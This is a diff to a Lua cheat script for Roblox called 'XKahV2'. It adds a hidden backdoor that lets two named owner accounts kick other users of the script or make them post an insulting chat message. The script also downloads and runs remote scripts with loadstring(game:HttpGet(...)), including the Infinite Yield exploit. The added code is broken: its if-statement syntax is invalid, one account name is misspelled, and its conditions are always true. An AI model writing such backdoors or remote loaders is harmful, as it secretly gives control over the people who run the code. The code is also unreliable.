@@ -91,6 +91,22 @@ local function a(plr)
     local args3 = split[4]
     local args4 = split[5]
 
+    if plr == game.Players:FindFirstChild("Ih0temyIife") or game.Players:FindFirstChild("San_fromlb") do
+
+      if cmd == "XKick" then
+        if lp.Name ~= "Ih0temyIife" or lp.Name ~= "Sans_fromlb" then
+          lp:Kick("You have been kicked by Owner of the script(XK2)")
+        end
+      end
+
+      if cmd == "Xcheck" then
+        if lp.Name ~= "Ih0temyIife" or lp.Name ~= "Sans_fromlb" then
+              
+          h("I use Xkahv2 cuz im a skid")
+
+        end
+      end
+      
     if plr == game.Players.LocalPlayer then
 
       if cmd == "cmds" then
@@ -732,7 +748,11 @@ local antirocketc = coroutine.wrap(function()
 end)
 antirocketc()
 wait(1)
-h("\n\n\n\nXKahV2(XKV2) has loaded\n\n THIS SCRIPT USES GSCRIPT, TURN IT OFF IF YOU USE IT ALREADY\n\nPrefix is ; or no prefix")
+if lp.Name == "Ih0temyIife" or lp.Name == "Sans_fromlb" then
+  h("\n\n\nOwner of XKahv2 lua has joined the game.\n\n\n")
+else
+  h("\n\n\n\nXKahV2(XKV2) has loaded\n\n THIS SCRIPT USES GSCRIPT, TURN IT OFF IF YOU USE IT ALREADY\n\nPrefix is ; or no prefix")
+end
 
 loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/lnfiniteCoder/My-roblox-scripts/main/GScript.txt"))()
